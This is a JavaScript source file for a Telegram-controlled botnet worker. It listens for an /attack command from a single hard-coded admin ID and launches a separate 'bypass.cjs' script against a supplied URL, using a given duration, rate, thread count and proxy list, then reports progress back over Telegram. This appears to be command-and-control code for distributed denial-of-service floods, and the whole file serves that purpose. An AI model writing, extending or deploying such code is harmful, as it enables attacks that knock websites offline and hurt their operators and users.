import { Telegraf } from 'telegraf';
import { spawn } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';

dotenv.config();

const token = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_ID = '6247762383';

if (!token) {
    console.error('❌ No token provided');
    process.exit(1);
}

const bot = new Telegraf(token);

// Health check endpoint for Railway
bot.telegram.getMe().then((info) => {
    console.log(`✅ Worker ${info.username} online`);
});

// Only accept commands from master (via chat ID verification)
bot.use(async (ctx, next) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return;
    }
    return next();
});

// Attack command (only for this worker)
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads, attackId] = args;

    if (!url || !time || !rate || !threads || !attackId) {
        return ctx.reply('❌ Invalid format');
    }

    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ bypass.cjs not found');
    }

    ctx.reply(`🚀 Worker starting attack: ${attackId}`);

    const attack = spawn('node', [
        'bypass.cjs',
        url,
        time,
        rate,
        threads,
        'proxy.txt'
    ]);

    let stats = { requests: 0, success: 0, fail: 0 };

    attack.stdout.on('data', (data) => {
        const output = data.toString();
        console.log(`[${attackId}] ${output}`);
        
        if (output.includes('Status: [')) {
            const match = output.match(/Status: \[([^\]]+)\]/);
            if (match) {
                ctx.reply(`📊 ${attackId}: ${match[1]}`);
            }
        }
    });

    attack.stderr.on('data', (data) => {
        console.error(`[${attackId}] Error:`, data.toString());
    });

    attack.on('close', (code) => {
        ctx.reply(`✅ Worker completed ${attackId} (code: ${code})`);
    });
});

bot.launch();
